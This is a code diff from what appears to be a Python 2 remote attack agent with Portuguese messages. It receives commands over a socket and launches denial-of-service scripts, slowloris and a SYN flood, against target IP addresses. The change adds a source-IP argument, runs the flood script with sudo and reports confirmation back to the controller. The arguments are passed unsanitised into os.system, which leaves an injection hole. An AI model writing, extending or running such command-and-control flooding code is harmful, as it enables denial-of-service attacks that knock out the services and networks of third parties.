@@ -45,11 +45,12 @@ if len(sys.argv) == 2:
                     if len(args) == 3:
                         os.system("python slowloris.py" + " " + args[1] + " " + args[2])
             else:
-                if args[0] == "synflood":
+                if args[0] == "synflood" and len(args) == 3:
                     print 'Iniciando o ataque syn flood...'
-                    os.system("python synflood.py" + " " + args[1])
+                    connectionSocket.send("Confirmed")
+                    os.system("sudo python synflood.py" + " " + args[1] + " " + args[2])
                 else:
-                    print 'Comando invalido'
+                    print 'Comando invalido synflood deve ser no formato synflood ipFonte ipDestino'
                     connectionSocket.send("Failed")
         else:
             print "Insira no minimo o nome do ataque e o endereco de ip destino"
